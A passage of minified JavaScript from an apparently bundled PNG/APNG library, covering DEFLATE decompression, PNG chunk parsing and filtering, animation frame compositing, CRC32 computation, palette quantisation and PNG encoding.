                const t = o[A(e, p) & d];
                p += 15 & t;
                const r = t >>> 4;
                if (r >>> 8 == 0) n[h++] = r;
                else {
                  if (256 == r) break;
                  {
                    let t = h + r - 254;
                    if (r > 264) {
                      const n = k.q[r - 257];
                      (t = h + (n >>> 3) + y(e, p, 7 & n)), (p += 7 & n);
                    }
                    const o = i[A(e, p) & f];
                    p += 15 & o;
                    const s = o >>> 4,
                      a = k.c[s],
                      u = (a >>> 4) + g(e, p, 15 & a);
                    for (p += 15 & a; h < t; )
                      (n[h] = n[h++ - u]),
                        (n[h] = n[h++ - u]),
                        (n[h] = n[h++ - u]),
                        (n[h] = n[h++ - u]);
                    h = t;
                  }
                }
              }
            } else {
              7 & p && (p += 8 - (7 & p));
              const o = 4 + (p >>> 3),
                i = e[o - 4] | (e[o - 3] << 8);
              I && (n = t.H.W(n, h + i)),
                n.set(new r(e.buffer, e.byteOffset + o, i), h),
                (p = (o + i) << 3),
                (h += i);
            }
          return n.length == h ? n : n.slice(0, h);
        }),
        (t.H.W = function (t, e) {
          const n = t.length;
          if (e <= n) return t;
          const r = new Uint8Array(n << 1);
          return r.set(t, 0), r;
        }),
        (t.H.R = function (e, n, r, o, i, s) {
          const a = t.H.e,
            u = t.H.Z;
          let c = 0;
          for (; c < r; ) {
            const t = e[u(o, i) & n];
            i += 15 & t;
            const r = t >>> 4;
            if (r <= 15) (s[c] = r), c++;
            else {
              let t = 0,
                e = 0;
              16 == r
                ? ((e = 3 + a(o, i, 2)), (i += 2), (t = s[c - 1]))
                : 17 == r
                ? ((e = 3 + a(o, i, 3)), (i += 3))
                : 18 == r && ((e = 11 + a(o, i, 7)), (i += 7));
              const n = c + e;
              for (; c < n; ) (s[c] = t), c++;
            }
          }
          return i;
        }),
        (t.H.V = function (t, e, n, r) {
          let o = 0,
            i = 0;
          const s = r.length >>> 1;
          for (; i < n; ) {
            const n = t[i + e];
            (r[i << 1] = 0), (r[1 + (i << 1)] = n), n > o && (o = n), i++;
          }
          for (; i < s; ) (r[i << 1] = 0), (r[1 + (i << 1)] = 0), i++;
          return o;
        }),
        (t.H.n = function (e, n) {
          const r = t.H.m,
            o = e.length;
          let i, s, a, u;
          const c = r.j;
          for (var l = 0; l <= n; l++) c[l] = 0;
          for (l = 1; l < o; l += 2) c[e[l]]++;
          const d = r.K;
          for (i = 0, c[0] = 0, s = 1; s <= n; s++)
            (i = (i + c[s - 1]) << 1), (d[s] = i);
          for (a = 0; a < o; a += 2)
            (u = e[a + 1]), 0 != u && ((e[a] = d[u]), d[u]++);
        }),
        (t.H.A = function (e, n, r) {
          const o = e.length,
            i = t.H.m.r;
          for (let t = 0; t < o; t += 2)
            if (0 != e[t + 1]) {
              const o = t >> 1,
                s = e[t + 1],
                a = (o << 4) | s,
                u = n - s;
              let c = e[t] << u;
              const l = c + (1 << u);
              for (; c != l; ) (r[i[c] >>> (15 - n)] = a), c++;
            }
        }),
        (t.H.l = function (e, n) {
          const r = t.H.m.r,
            o = 15 - n;
          for (let t = 0; t < e.length; t += 2) {
            const i = e[t] << (n - e[t + 1]);
            e[t] = r[i] >>> o;
          }
        }),
        (t.H.M = function (t, e, n) {
          n <<= 7 & e;
          const r = e >>> 3;
          (t[r] |= n), (t[r + 1] |= n >>> 8);
        }),
        (t.H.I = function (t, e, n) {
          n <<= 7 & e;
          const r = e >>> 3;
          (t[r] |= n), (t[r + 1] |= n >>> 8), (t[r + 2] |= n >>> 16);
        }),
        (t.H.e = function (t, e, n) {
          return (
            ((t[e >>> 3] | (t[1 + (e >>> 3)] << 8)) >>> (7 & e)) &
            ((1 << n) - 1)
          );
        }),
        (t.H.b = function (t, e, n) {
          return (
            ((t[e >>> 3] |
              (t[1 + (e >>> 3)] << 8) |
              (t[2 + (e >>> 3)] << 16)) >>>
              (7 & e)) &
            ((1 << n) - 1)
          );
        }),
        (t.H.Z = function (t, e) {
          return (
            (t[e >>> 3] |
              (t[1 + (e >>> 3)] << 8) |
              (t[2 + (e >>> 3)] << 16)) >>>
            (7 & e)
          );
        }),
        (t.H.i = function (t, e) {
          return (
            (t[e >>> 3] |
              (t[1 + (e >>> 3)] << 8) |
              (t[2 + (e >>> 3)] << 16) |
              (t[3 + (e >>> 3)] << 24)) >>>
            (7 & e)
          );
        }),
        (t.H.m = (function () {
          const t = Uint16Array,
            e = Uint32Array;
          return {
            K: new t(16),
            j: new t(16),
            X: [
              16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15,
            ],
            S: [
              3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 15, 17, 19, 23, 27, 31, 35, 43,
              51, 59, 67, 83, 99, 115, 131, 163, 195, 227, 258, 999, 999, 999,
            ],
            T: [
              0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 2, 2, 2, 2, 3, 3, 3, 3, 4, 4,
              4, 4, 5, 5, 5, 5, 0, 0, 0, 0,
            ],
            q: new t(32),
            p: [
              1, 2, 3, 4, 5, 7, 9, 13, 17, 25, 33, 49, 65, 97, 129, 193, 257,
              385, 513, 769, 1025, 1537, 2049, 3073, 4097, 6145, 8193, 12289,
              16385, 24577, 65535, 65535,
            ],
            z: [
              0, 0, 0, 0, 1, 1, 2, 2, 3, 3, 4, 4, 5, 5, 6, 6, 7, 7, 8, 8, 9, 9,
              10, 10, 11, 11, 12, 12, 13, 13, 0, 0,
            ],
            c: new e(32),
            J: new t(512),
            _: [],
            h: new t(32),
            $: [],
            w: new t(32768),
            C: [],
            v: [],
            d: new t(32768),
            D: [],
            u: new t(512),
            Q: [],
            r: new t(32768),
            s: new e(286),
            Y: new e(30),
            a: new e(19),
            t: new e(15e3),
            k: new t(65536),
            g: new t(32768),
          };
        })()),
        (function () {
          const e = t.H.m;
          for (var n = 0; n < 32768; n++) {
            let t = n;
            (t = ((2863311530 & t) >>> 1) | ((1431655765 & t) << 1)),
              (t = ((3435973836 & t) >>> 2) | ((858993459 & t) << 2)),
              (t = ((4042322160 & t) >>> 4) | ((252645135 & t) << 4)),
              (t = ((4278255360 & t) >>> 8) | ((16711935 & t) << 8)),
              (e.r[n] = ((t >>> 16) | (t << 16)) >>> 17);
          }
          function r(t, e, n) {
            for (; 0 != e--; ) t.push(0, n);
          }
          for (n = 0; n < 32; n++)
            (e.q[n] = (e.S[n] << 3) | e.T[n]),
              (e.c[n] = (e.p[n] << 4) | e.z[n]);
          r(e._, 144, 8),
            r(e._, 112, 9),
            r(e._, 24, 7),
            r(e._, 8, 8),
            t.H.n(e._, 9),
            t.H.A(e._, 9, e.J),
            t.H.l(e._, 9),
            r(e.$, 32, 5),
            t.H.n(e.$, 5),
            t.H.A(e.$, 5, e.h),
            t.H.l(e.$, 5),
            r(e.Q, 19, 0),
            r(e.C, 286, 0),
            r(e.D, 30, 0),
            r(e.v, 320, 0);
        })(),
        t.H.N
      );
    })();
    function i(t) {
      return [1, null, 3, 1, 2, null, 4][t.ctype] * t.depth;
    }
    function s(t, e, n, r, o) {
      let s = i(e);
      const u = Math.ceil((r * s) / 8);
      let c, l;
      s = Math.ceil(s / 8);
      let d = t[n],
        f = 0;
      if ((d > 1 && (t[n] = [0, 0, 1][d - 2]), 3 == d))
        for (f = s; f < u; f++)
          t[f + 1] = (t[f + 1] + (t[f + 1 - s] >>> 1)) & 255;
      for (let i = 0; i < o; i++)
        if (((c = n + i * u), (l = c + i + 1), (d = t[l - 1]), (f = 0), 0 == d))
          for (; f < u; f++) t[c + f] = t[l + f];
        else if (1 == d) {
          for (; f < s; f++) t[c + f] = t[l + f];
          for (; f < u; f++) t[c + f] = t[l + f] + t[c + f - s];
        } else if (2 == d)
          for (; f < u; f++) t[c + f] = t[l + f] + t[c + f - u];
        else if (3 == d) {
          for (; f < s; f++) t[c + f] = t[l + f] + (t[c + f - u] >>> 1);
          for (; f < u; f++)
            t[c + f] = t[l + f] + ((t[c + f - u] + t[c + f - s]) >>> 1);
        } else {
          for (; f < s; f++) t[c + f] = t[l + f] + a(0, t[c + f - u], 0);
          for (; f < u; f++)
            t[c + f] =
              t[l + f] + a(t[c + f - s], t[c + f - u], t[c + f - s - u]);
        }
      return t;
    }
    function a(t, e, n) {
      const r = t + e - n,
        o = r - t,
        i = r - e,
        s = r - n;
      return o * o <= i * i && o * o <= s * s ? t : i * i <= s * s ? e : n;
    }
    function u(e, n, r) {
      (r.width = t.readUint(e, n)),
        (n += 4),
        (r.height = t.readUint(e, n)),
        (n += 4),
        (r.depth = e[n]),
        n++,
        (r.ctype = e[n]),
        n++,
        (r.compress = e[n]),
        n++,
        (r.filter = e[n]),
        n++,
        (r.interlace = e[n]),
        n++;
    }
    function c(t, e, n, r, o, i, s, a, u) {
      const c = Math.min(e, o),
        l = Math.min(n, i);
      let d = 0,
        f = 0;
      for (let A = 0; A < l; A++)
        for (let n = 0; n < c; n++)
          if (
            (s >= 0 && a >= 0
              ? ((d = (A * e + n) << 2), (f = ((a + A) * o + s + n) << 2))
              : ((d = ((-a + A) * e - s + n) << 2), (f = (A * o + n) << 2)),
            0 == u)
          )
            (r[f] = t[d]),
              (r[f + 1] = t[d + 1]),
              (r[f + 2] = t[d + 2]),
              (r[f + 3] = t[d + 3]);
          else if (1 == u) {
            var h = t[d + 3] * (1 / 255),
              p = t[d] * h,
              m = t[d + 1] * h,
              g = t[d + 2] * h,
              y = r[f + 3] * (1 / 255),
              w = r[f] * y,
              b = r[f + 1] * y,
              v = r[f + 2] * y;
            const e = 1 - h,
              n = h + y * e,
              o = 0 == n ? 0 : 1 / n;
            (r[f + 3] = 255 * n),
              (r[f + 0] = (p + w * e) * o),
              (r[f + 1] = (m + b * e) * o),
              (r[f + 2] = (g + v * e) * o);
          } else if (2 == u)
            (h = t[d + 3]),
              (p = t[d]),
              (m = t[d + 1]),
              (g = t[d + 2]),
              (y = r[f + 3]),
              (w = r[f]),
              (b = r[f + 1]),
              (v = r[f + 2]),
              h == y && p == w && m == b && g == v
                ? ((r[f] = 0), (r[f + 1] = 0), (r[f + 2] = 0), (r[f + 3] = 0))
                : ((r[f] = p), (r[f + 1] = m), (r[f + 2] = g), (r[f + 3] = h));
          else if (3 == u) {
            if (
              ((h = t[d + 3]),
              (p = t[d]),
              (m = t[d + 1]),
              (g = t[d + 2]),
              (y = r[f + 3]),
              (w = r[f]),
              (b = r[f + 1]),
              (v = r[f + 2]),
              h == y && p == w && m == b && g == v)
            )
              continue;
            if (h < 220 && y > 20) return !1;
          }
      return !0;
    }
    return {
      decode: function (e) {
        const i = new Uint8Array(e);
        let s = 8;
        const a = t,
          c = a.readUshort,
          l = a.readUint,
          d = { tabs: {}, frames: [] },
          f = new Uint8Array(i.length);
        let h,
          p = 0,
          m = 0;
        const g = [137, 80, 78, 71, 13, 10, 26, 10];
        for (var y = 0; y < 8; y++)
          if (i[y] != g[y]) throw "The input is not a PNG file!";
        for (; s < i.length; ) {
          const t = a.readUint(i, s);
          s += 4;
          const e = a.readASCII(i, s, 4);
          if (((s += 4), "IHDR" == e)) u(i, s, d);
          else if ("iCCP" == e) {
            for (var w = s; 0 != i[w]; ) w++;
            a.readASCII(i, s, w - s), i[w + 1];
            const n = i.slice(w + 2, s + t);
            let u = null;
            try {
              u = r(n);
            } catch (_) {
              u = o(n);
            }
            d.tabs[e] = u;
          } else if ("CgBI" == e) d.tabs[e] = i.slice(s, s + 4);
          else if ("IDAT" == e) {
            for (y = 0; y < t; y++) f[p + y] = i[s + y];
            p += t;
          } else if ("acTL" == e)
            (d.tabs[e] = { num_frames: l(i, s), num_plays: l(i, s + 4) }),
              (h = new Uint8Array(i.length));
          else if ("fcTL" == e) {
            0 != m &&
              (((S = d.frames[d.frames.length - 1]).data = n(
                d,
                h.slice(0, m),
                S.rect.width,
                S.rect.height
              )),
              (m = 0));
            const t = {
              x: l(i, s + 12),
              y: l(i, s + 16),
              width: l(i, s + 4),
              height: l(i, s + 8),
            };
            let e = c(i, s + 22);
            e = c(i, s + 20) / (0 == e ? 100 : e);
            const r = {
              rect: t,
              delay: Math.round(1e3 * e),
              dispose: i[s + 24],
              blend: i[s + 25],
            };
            d.frames.push(r);
          } else if ("fdAT" == e) {
            for (y = 0; y < t - 4; y++) h[m + y] = i[s + y + 4];
            m += t - 4;
          } else if ("pHYs" == e)
            d.tabs[e] = [a.readUint(i, s), a.readUint(i, s + 4), i[s + 8]];
          else if ("cHRM" == e)
            for (d.tabs[e] = [], y = 0; y < 8; y++)
              d.tabs[e].push(a.readUint(i, s + 4 * y));
          else if ("tEXt" == e || "zTXt" == e) {
            null == d.tabs[e] && (d.tabs[e] = {});
            var b = a.nextZero(i, s),
              v = a.readASCII(i, s, b - s),
              A = s + t - b - 1;
            if ("tEXt" == e) I = a.readASCII(i, b + 1, A);
            else {
              var k = r(i.slice(b + 2, b + 2 + A));
              I = a.readUTF8(k, 0, k.length);
            }
            d.tabs[e][v] = I;
          } else if ("iTXt" == e) {
            null == d.tabs[e] && (d.tabs[e] = {}),
              (b = 0),
              (w = s),
              (b = a.nextZero(i, w)),
              (v = a.readASCII(i, w, b - w));
            const n = i[(w = b + 1)];
            var I;
            i[w + 1],
              (w += 2),
              (b = a.nextZero(i, w)),
              a.readASCII(i, w, b - w),
              (w = b + 1),
              (b = a.nextZero(i, w)),
              a.readUTF8(i, w, b - w),
              (A = t - ((w = b + 1) - s)),
              0 == n
                ? (I = a.readUTF8(i, w, A))
                : ((k = r(i.slice(w, w + A))),
                  (I = a.readUTF8(k, 0, k.length))),
              (d.tabs[e][v] = I);
          } else if ("PLTE" == e) d.tabs[e] = a.readBytes(i, s, t);
          else if ("hIST" == e) {
            const t = d.tabs.PLTE.length / 3;
            for (d.tabs[e] = [], y = 0; y < t; y++)
              d.tabs[e].push(c(i, s + 2 * y));
          } else if ("tRNS" == e)
            3 == d.ctype
              ? (d.tabs[e] = a.readBytes(i, s, t))
              : 0 == d.ctype
              ? (d.tabs[e] = c(i, s))
              : 2 == d.ctype &&
                (d.tabs[e] = [c(i, s), c(i, s + 2), c(i, s + 4)]);
          else if ("gAMA" == e) d.tabs[e] = a.readUint(i, s) / 1e5;
          else if ("sRGB" == e) d.tabs[e] = i[s];
          else if ("bKGD" == e)
            0 == d.ctype || 4 == d.ctype
              ? (d.tabs[e] = [c(i, s)])
              : 2 == d.ctype || 6 == d.ctype
              ? (d.tabs[e] = [c(i, s), c(i, s + 2), c(i, s + 4)])
              : 3 == d.ctype && (d.tabs[e] = i[s]);
          else if ("IEND" == e) break;
          (s += t), a.readUint(i, s), (s += 4);
        }
        var S;
        return (
          0 != m &&
            ((S = d.frames[d.frames.length - 1]).data = n(
              d,
              h.slice(0, m),
              S.rect.width,
              S.rect.height
            )),
          (d.data = n(d, f, d.width, d.height)),
          delete d.compress,
          delete d.interlace,
          delete d.filter,
          d
        );
      },
      toRGBA8: function (t) {
        const n = t.width,
          r = t.height;
        if (null == t.tabs.acTL) return [e(t.data, n, r, t).buffer];
        const o = [];
        null == t.frames[0].data && (t.frames[0].data = t.data);
        const i = n * r * 4,
          s = new Uint8Array(i),
          a = new Uint8Array(i),
          u = new Uint8Array(i);
        for (let d = 0; d < t.frames.length; d++) {
          const f = t.frames[d],
            h = f.rect.x,
            p = f.rect.y,
            m = f.rect.width,
            g = f.rect.height,
            y = e(f.data, m, g, t);
          if (0 != d) for (var l = 0; l < i; l++) u[l] = s[l];
          if (
            (0 == f.blend
              ? c(y, m, g, s, n, r, h, p, 0)
              : 1 == f.blend && c(y, m, g, s, n, r, h, p, 1),
            o.push(s.buffer.slice(0)),
            0 == f.dispose)
          );
          else if (1 == f.dispose) c(a, m, g, s, n, r, h, p, 0);
          else if (2 == f.dispose) for (l = 0; l < i; l++) s[l] = u[l];
        }
        return o;
      },
      _paeth: a,
      _copyTile: c,
      _bin: t,
    };
  })();
  !(function () {
    const { _copyTile: t } = sO,
      { _bin: e } = sO,
      n = sO._paeth;
    var r = {
      table: (function () {
        const t = new Uint32Array(256);
        for (let e = 0; e < 256; e++) {
          let n = e;
          for (let t = 0; t < 8; t++)
            1 & n ? (n = 3988292384 ^ (n >>> 1)) : (n >>>= 1);
          t[e] = n;
        }
        return t;
      })(),
      update(t, e, n, o) {
        for (let i = 0; i < o; i++)
          t = r.table[255 & (t ^ e[n + i])] ^ (t >>> 8);
        return t;
      },
      crc: (t, e, n) => 4294967295 ^ r.update(4294967295, t, e, n),
    };
    function o(t, e, n, r) {
      (e[n] += (t[0] * r) >> 4),
        (e[n + 1] += (t[1] * r) >> 4),
        (e[n + 2] += (t[2] * r) >> 4),
        (e[n + 3] += (t[3] * r) >> 4);
    }
    function i(t) {
      return Math.max(0, Math.min(255, t));
    }
    function s(t, e) {
      const n = t[0] - e[0],
        r = t[1] - e[1],
        o = t[2] - e[2],
        i = t[3] - e[3];
      return n * n + r * r + o * o + i * i;
    }
    function a(t, e, n, r, a, u, c) {
      null == c && (c = 1);
      const l = r.length,
        d = [];
      for (var f = 0; f < l; f++) {
        const t = r[f];
        d.push([
          (t >>> 0) & 255,
          (t >>> 8) & 255,
          (t >>> 16) & 255,
          (t >>> 24) & 255,
        ]);
      }
      for (f = 0; f < l; f++) {
        let t = 4294967295;
        for (var h = 0, p = 0; p < l; p++) {
          var m = s(d[f], d[p]);
          p != f && m < t && ((t = m), (h = p));
        }
      }
      const g = new Uint32Array(a.buffer),
        y = new Int16Array(e * n * 4),
        w = [0, 8, 2, 10, 12, 4, 14, 6, 3, 11, 1, 9, 15, 7, 13, 5];
      for (f = 0; f < w.length; f++) w[f] = 255 * ((w[f] + 0.5) / 16 - 0.5);
      for (let v = 0; v < n; v++)
        for (let a = 0; a < e; a++) {
          var b;
          (f = 4 * (v * e + a)),
            2 != c
              ? (b = [
                  i(t[f] + y[f]),
                  i(t[f + 1] + y[f + 1]),
                  i(t[f + 2] + y[f + 2]),
                  i(t[f + 3] + y[f + 3]),
                ])
              : ((m = w[4 * (3 & v) + (3 & a)]),
                (b = [
                  i(t[f] + m),
                  i(t[f + 1] + m),
                  i(t[f + 2] + m),
                  i(t[f + 3] + m),
                ])),
            (h = 0);
          let A = 16777215;
          for (p = 0; p < l; p++) {
            const t = s(b, d[p]);
            t < A && ((A = t), (h = p));
          }
          const k = d[h],
            I = [b[0] - k[0], b[1] - k[1], b[2] - k[2], b[3] - k[3]];
          1 == c &&
            (a != e - 1 && o(I, y, f + 4, 7),
            v != n - 1 &&
              (0 != a && o(I, y, f + 4 * e - 4, 3),
              o(I, y, f + 4 * e, 5),
              a != e - 1 && o(I, y, f + 4 * e + 4, 1))),
            (u[f >> 2] = h),
            (g[f >> 2] = r[h]);
        }
    }
    function u(t, n, o, i, s) {
      null == s && (s = {});
      const { crc: a } = r,
        u = e.writeUint,
        c = e.writeUshort,
        l = e.writeASCII;
      let d = 8;
      const f = t.frames.length > 1;
      let h,
        p = !1,
        m = 33 + (f ? 20 : 0);
      if (
        (null != s.sRGB && (m += 13),
        null != s.pHYs && (m += 21),
        null != s.iCCP &&
          ((h = pako.deflate(s.iCCP)), (m += 21 + h.length + 4)),
        3 == t.ctype)
      ) {
        for (var g = t.plte.length, y = 0; y < g; y++)
          t.plte[y] >>> 24 != 255 && (p = !0);
        m += 8 + 3 * g + 4 + (p ? 8 + 1 * g + 4 : 0);
      }
      for (var w = 0; w < t.frames.length; w++)
        f && (m += 38),
          (m += (k = t.frames[w]).cimg.length + 12),
          0 != w && (m += 4);
      m += 12;
      const b = new Uint8Array(m),
        v = [137, 80, 78, 71, 13, 10, 26, 10];
      for (y = 0; y < 8; y++) b[y] = v[y];
      if (
        (u(b, d, 13),
        (d += 4),
        l(b, d, "IHDR"),
        (d += 4),
        u(b, d, n),
        (d += 4),
        u(b, d, o),
        (d += 4),
        (b[d] = t.depth),
        d++,
        (b[d] = t.ctype),
        d++,
        (b[d] = 0),
        d++,
        (b[d] = 0),
        d++,
        (b[d] = 0),
        d++,
        u(b, d, a(b, d - 17, 17)),
        (d += 4),
        null != s.sRGB &&
          (u(b, d, 1),
          (d += 4),
          l(b, d, "sRGB"),
          (d += 4),
          (b[d] = s.sRGB),
          d++,
          u(b, d, a(b, d - 5, 5)),
          (d += 4)),
        null != s.iCCP)
      ) {
        const t = 13 + h.length;
        u(b, d, t),
          (d += 4),
          l(b, d, "iCCP"),
          (d += 4),
          l(b, d, "ICC profile"),
          (d += 11),
          (d += 2),
          b.set(h, d),
          (d += h.length),
          u(b, d, a(b, d - (t + 4), t + 4)),
          (d += 4);
      }
      if (
        (null != s.pHYs &&
          (u(b, d, 9),
          (d += 4),
          l(b, d, "pHYs"),
          (d += 4),
          u(b, d, s.pHYs[0]),
          (d += 4),
          u(b, d, s.pHYs[1]),
          (d += 4),
          (b[d] = s.pHYs[2]),
          d++,
          u(b, d, a(b, d - 13, 13)),
          (d += 4)),
        f &&
          (u(b, d, 8),
          (d += 4),
          l(b, d, "acTL"),
          (d += 4),
          u(b, d, t.frames.length),
          (d += 4),
          u(b, d, null != s.loop ? s.loop : 0),
          (d += 4),
          u(b, d, a(b, d - 12, 12)),
          (d += 4)),
        3 == t.ctype)
      ) {
        for (
          u(b, d, 3 * (g = t.plte.length)),
            d += 4,
            l(b, d, "PLTE"),
            d += 4,
            y = 0;
          y < g;
          y++
        ) {
          const e = 3 * y,
            n = t.plte[y],
            r = 255 & n,
            o = (n >>> 8) & 255,
            i = (n >>> 16) & 255;
          (b[d + e + 0] = r), (b[d + e + 1] = o), (b[d + e + 2] = i);
        }
        if (
          ((d += 3 * g), u(b, d, a(b, d - 3 * g - 4, 3 * g + 4)), (d += 4), p)
        ) {
          for (u(b, d, g), d += 4, l(b, d, "tRNS"), d += 4, y = 0; y < g; y++)
            b[d + y] = (t.plte[y] >>> 24) & 255;
          (d += g), u(b, d, a(b, d - g - 4, g + 4)), (d += 4);
        }
      }
      let A = 0;
      for (w = 0; w < t.frames.length; w++) {
        var k = t.frames[w];
        f &&
          (u(b, d, 26),
          (d += 4),
          l(b, d, "fcTL"),
          (d += 4),
          u(b, d, A++),
          (d += 4),
          u(b, d, k.rect.width),
          (d += 4),
          u(b, d, k.rect.height),
          (d += 4),
          u(b, d, k.rect.x),
          (d += 4),
          u(b, d, k.rect.y),
          (d += 4),
          c(b, d, i[w]),
          (d += 2),
          c(b, d, 1e3),
          (d += 2),
          (b[d] = k.dispose),
          d++,
          (b[d] = k.blend),
          d++,
          u(b, d, a(b, d - 30, 30)),
          (d += 4));
        const e = k.cimg;
        u(b, d, (g = e.length) + (0 == w ? 0 : 4)), (d += 4);
        const n = d;
        l(b, d, 0 == w ? "IDAT" : "fdAT"),
          (d += 4),
          0 != w && (u(b, d, A++), (d += 4)),
          b.set(e, d),
          (d += g),
          u(b, d, a(b, n, d - n)),
          (d += 4);
      }
      return (
        u(b, d, 0),
        (d += 4),
        l(b, d, "IEND"),
        (d += 4),
        u(b, d, a(b, d - 4, 4)),
        (d += 4),
        b.buffer
      );
    }
    function c(t, e, n) {
      for (let r = 0; r < t.frames.length; r++) {
        const o = t.frames[r];
        o.rect.width;
        const i = o.rect.height,
          s = new Uint8Array(i * o.bpl + i);
        o.cimg = h(o.img, i, o.bpp, o.bpl, s, e, n);
      }
    }
    function l(e, n, r, o, i) {
      const s = i[0],
        u = i[1],
        c = i[2],
        l = i[3],
        h = i[4],
        p = i[5];
      let g = 6,
        y = 8,
        w = 255;
      for (var b = 0; b < e.length; b++) {
        const t = new Uint8Array(e[b]);
        for (var v = t.length, A = 0; A < v; A += 4) w &= t[A + 3];
      }
      const k = 255 != w,
        I = (function (e, n, r, o, i, s) {
          const a = [];
          for (var u = 0; u < e.length; u++) {
            const d = new Uint8Array(e[u]),
              h = new Uint32Array(d.buffer);
            var c;
            let m = 0,
              g = 0,
              y = n,
              w = r,
              b = o ? 1 : 0;
            if (0 != u) {
              const v = s || o || 1 == u || 0 != a[u - 2].dispose ? 1 : 2;
              let A = 0,
                k = 1e9;
              for (let t = 0; t < v; t++) {
                var l = new Uint8Array(e[u - 1 - t]);
                const o = new Uint32Array(e[u - 1 - t]);
                let s = n,
                  a = r,
                  c = -1,
                  d = -1;
                for (let t = 0; t < r; t++)
                  for (let e = 0; e < n; e++)
                    h[(p = t * n + e)] != o[p] &&
                      (e < s && (s = e),
                      e > c && (c = e),
                      t < a && (a = t),
                      t > d && (d = t));
                -1 == c && (s = a = c = d = 0),
                  i && (!(1 & ~s) && s--, !(1 & ~a) && a--);
                const f = (c - s + 1) * (d - a + 1);
                f < k &&
                  ((k = f),
                  (A = t),
                  (m = s),
                  (g = a),
                  (y = c - s + 1),
                  (w = d - a + 1));
              }
              (l = new Uint8Array(e[u - 1 - A])),
                1 == A && (a[u - 1].dispose = 2),
                (c = new Uint8Array(y * w * 4)),
                t(l, n, r, c, y, w, -m, -g, 0),
                (b = t(d, n, r, c, y, w, -m, -g, 3) ? 1 : 0),
                1 == b
                  ? f(d, n, r, c, { x: m, y: g, width: y, height: w })
                  : t(d, n, r, c, y, w, -m, -g, 0);
            } else c = d.slice(0);
            a.push({
              rect: { x: m, y: g, width: y, height: w },
              img: c,
              blend: b,
              dispose: 0,
            });
          }
          if (o)
            for (u = 0; u < a.length; u++) {
              if (1 == (m = a[u]).blend) continue;
              const t = m.rect,
                o = a[u - 1].rect,
                s = Math.min(t.x, o.x),
                c = Math.min(t.y, o.y),
                l = {
                  x: s,
                  y: c,
                  width: Math.max(t.x + t.width, o.x + o.width) - s,
                  height: Math.max(t.y + t.height, o.y + o.height) - c,
                };
              (a[u - 1].dispose = 1),
                u - 1 != 0 && d(e, n, r, a, u - 1, l, i),
                d(e, n, r, a, u, l, i);
            }
          let h = 0;
          if (1 != e.length)
            for (var p = 0; p < a.length; p++) {
              var m;
              h += (m = a[p]).rect.width * m.rect.height;
            }
          return a;
        })(e, n, r, s, u, c),
        S = {},
        _ = [],
        T = [];
      if (0 != o) {
        const t = [];
        for (A = 0; A < I.length; A++) t.push(I[A].img.buffer);
        const e = m(
          (function (t) {
            let e = 0;
            for (var n = 0; n < t.length; n++) e += t[n].byteLength;
            const r = new Uint8Array(e);
            let o = 0;
            for (n = 0; n < t.length; n++) {
              const e = new Uint8Array(t[n]),
                i = e.length;
              for (let t = 0; t < i; t += 4) {
                let n = e[t],
                  i = e[t + 1],
                  s = e[t + 2];
                const a = e[t + 3];
                0 == a && (n = i = s = 0),
                  (r[o + t] = n),
                  (r[o + t + 1] = i),
                  (r[o + t + 2] = s),
                  (r[o + t + 3] = a);
              }
              o += i;
            }
            return r.buffer;
          })(t),
          o
        );
        for (A = 0; A < e.plte.length; A++) _.push(e.plte[A].est.rgba);
        let n = 0;
        for (A = 0; A < I.length; A++) {
          const t = (C = I[A]).img.length;
          var B = new Uint8Array(e.inds.buffer, n >> 2, t >> 2);
          T.push(B);
          const r = new Uint8Array(e.abuf, n, t);
          p && a(C.img, C.rect.width, C.rect.height, _, r, B),
            C.img.set(r),
            (n += t);
        }
      } else
        for (b = 0; b < I.length; b++) {
          var C = I[b];
          const t = new Uint32Array(C.img.buffer);
          var E = C.rect.width;
          for (
            v = t.length, B = new Uint8Array(v), T.push(B), A = 0;
            A < v;
            A++
          ) {
            const e = t[A];
            if (0 != A && e == t[A - 1]) B[A] = B[A - 1];
            else if (A > E && e == t[A - E]) B[A] = B[A - E];
            else {
              let t = S[e];
              if (
                null == t &&
                ((S[e] = t = _.length), _.push(e), _.length >= 300)
              )
                break;
              B[A] = t;
            }
          }
        }
      const x = _.length;
      for (
        x <= 256 &&
          0 == h &&
          ((y = x <= 2 ? 1 : x <= 4 ? 2 : x <= 16 ? 4 : 8),
          (y = Math.max(y, l))),
          b = 0;
        b < I.length;
        b++
      ) {
        (C = I[b]).rect.x, C.rect.y, (E = C.rect.width);
        const t = C.rect.height;
        let e = C.img;
        new Uint32Array(e.buffer);
        let n = 4 * E,
          r = 4;
        if (x <= 256 && 0 == h) {
          n = Math.ceil((y * E) / 8);
          var P = new Uint8Array(n * t);
          const o = T[b];
          for (let e = 0; e < t; e++) {
            A = e * n;
            const t = e * E;
            if (8 == y) for (var O = 0; O < E; O++) P[A + O] = o[t + O];
            else if (4 == y)
              for (O = 0; O < E; O++)
                P[A + (O >> 1)] |= o[t + O] << (4 - 4 * (1 & O));
            else if (2 == y)
              for (O = 0; O < E; O++)
                P[A + (O >> 2)] |= o[t + O] << (6 - 2 * (3 & O));
            else if (1 == y)
              for (O = 0; O < E; O++)
                P[A + (O >> 3)] |= o[t + O] << (7 - 1 * (7 & O));
          }
          (e = P), (g = 3), (r = 1);
        } else if (0 == k && 1 == I.length) {
          P = new Uint8Array(E * t * 3);
          const o = E * t;
          for (A = 0; A < o; A++) {
            const t = 3 * A,
              n = 4 * A;
            (P[t] = e[n]), (P[t + 1] = e[n + 1]), (P[t + 2] = e[n + 2]);
          }
          (e = P), (g = 2), (r = 3), (n = 3 * E);
        }
        (C.img = e), (C.bpl = n), (C.bpp = r);
      }
      return { ctype: g, depth: y, plte: _, frames: I };
    }
    function d(e, n, r, o, i, s, a) {
      const u = Uint8Array,
        c = Uint32Array,
        l = new u(e[i - 1]),
        d = new c(e[i - 1]),
        h = i + 1 < e.length ? new u(e[i + 1]) : null,
        p = new u(e[i]),
        m = new c(p.buffer);
      let g = n,
        y = r,
        w = -1,
        b = -1;
      for (let t = 0; t < s.height; t++)
        for (let e = 0; e < s.width; e++) {
          const r = s.x + e,
            a = s.y + t,
            u = a * n + r,
            c = m[u];
          0 == c ||
            (0 == o[i - 1].dispose &&
              d[u] == c &&
              (null == h || 0 != h[4 * u + 3])) ||
            (r < g && (g = r),
            r > w && (w = r),
            a < y && (y = a),
            a > b && (b = a));
        }
      -1 == w && (g = y = w = b = 0),
